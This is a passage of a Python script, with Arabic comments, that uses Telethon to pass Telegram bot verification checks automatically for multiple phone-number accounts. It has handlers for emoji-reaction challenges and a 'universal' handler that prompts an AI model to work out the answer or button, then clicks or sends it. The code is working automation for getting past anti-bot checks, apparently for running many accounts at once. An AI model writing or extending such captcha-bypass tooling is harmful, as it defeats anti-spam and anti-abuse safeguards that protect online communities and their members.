                    logger.warning(f"⚠️ Text captcha ({phone}): {_te}")

            # ════════════════════════════════════════════════════
            # 7. ردود فعل Reactions
            # ════════════════════════════════════════════════════
            if any(k in msg_lower for k in REACTION_KW):
                try:
                    from telethon.tl.functions.messages import SendReactionRequest
                    from telethon.tl.types import ReactionEmoji
                    prompt_react = (
                        f"بوت تيليغرام يطلب التفاعل:\n{msg_text}\n\n"
                        "ما هو الإيموجي المطلوب؟ أجب بالإيموجي فقط مثل: 👍 ❤️ 🔥"
                    )
                    emoji_ans = await _ai_text(prompt_react)
                    if emoji_ans:
                        emoji_clean = (_extract_emojis(emoji_ans) or ["👍"])[0]
                        processed_ids.add(msg_id)
                        await client(SendReactionRequest(
                            peer=bot_entity, msg_id=msg_id,
                            reaction=[ReactionEmoji(emoticon=emoji_clean)],
                        ))
                        result, msgs = await _wait_bot()
                        all_details.append(f"Reaction: {emoji_clean}")
                        logger.info(f"🤖 Reaction → '{emoji_clean}' ({phone})")
                        if result == "success":
                            return True, f"نجح التحقق ✅ | {' | '.join(all_details)}"
                        elif result != "fail":
                            return True, f"أُرسل تفاعل | {' | '.join(all_details)}"
                except Exception as _re:
                    logger.warning(f"⚠️ Reaction ({phone}): {_re}")

            # ════════════════════════════════════════════════════
            # 8. المعالج الشامل — أي رسالة غير معروفة تُحلَّل بالكامل
            # ════════════════════════════════════════════════════
            if msg_text and msg_id not in processed_ids and _round >= 1:
                try:
                    btn_summary = ""
                    if has_btns:
                        _lbls = [getattr(b, "text", "") for row in msg.buttons for b in row]
                        btn_summary = f"\nالأزرار: {', '.join(_lbls)}"
                    prompt_universal = (
                        "أنت مساعد ذكي يحل تحقق بوتات تيليغرام.\n"
                        f"الرسالة من البوت:\n{msg_text}{btn_summary}\n\n"
                        "قرر: ما الإجراء الصحيح للمستخدم للاجتياز؟\n"
                        "إذا كان سؤالاً → أجب بالإجابة فقط\n"
                        "إذا كان كوداً في الصورة → قل 'IMAGE'\n"
                        "إذا يطلب ضغط زر → قل اسم الزر بالضبط\n"
                        "إذا لا يوجد تحقق → قل 'NONE'\n"
                        "أجب بكلمة أو جملة قصيرة فقط."
                    )
                    univ_ans = await _ai_text(prompt_universal)
                    if univ_ans and univ_ans.strip().upper() not in ("NONE", "IMAGE"):
                        # ابحث عن الزر المطابق أولاً
                        _matched_btn = None
                        if has_btns:
                            for row in msg.buttons:
                                for btn in row:
                                    lbl = getattr(btn, "text", "") or ""
                                    if lbl and (univ_ans.strip() in lbl or lbl in univ_ans.strip()):
                                        _matched_btn = btn
                                        break
                        if _matched_btn:
                            processed_ids.add(msg_id)
                            await _click_smart(_matched_btn)
                            result, msgs = await _wait_bot()
                            all_details.append(f"Universal-btn: {getattr(_matched_btn, 'text', '')}")
                            if result == "success":
                                return True, f"نجح التحقق ✅ | {' | '.join(all_details)}"
                        else:
                            # أرسل كنص
                            processed_ids.add(msg_id)
                            await client.send_message(bot_entity, univ_ans.strip())
                            result, msgs = await _wait_bot()
                            all_details.append(f"Universal-text: {univ_ans.strip()}")
                            logger.info(f"🌐 Universal handler → '{univ_ans.strip()}' ({phone})")
                            if result == "success":
                                return True, f"نجح التحقق ✅ | {' | '.join(all_details)}"
                            elif result == "fail":
                                _ai_failed_rounds += 1
                except Exception as _ue2:
                    logger.warning(f"⚠️ Universal handler ({phone}): {_ue2}")

        # توقف مبكر إذا فشل AI كثيراً
        if _ai_failed_rounds >= 4:
            break

    # ════════════════════════════════════════════════════════════
    # ── النتيجة النهائية ──────────────────────────────────────
    # ════════════════════════════════════════════════════════════
    if all_details:
        return True, f"حُلّ جزئياً | {' | '.join(all_details)}"
    return False, "لم يُكتشف تحقق — تحقق من إعداد مفاتيح AI"
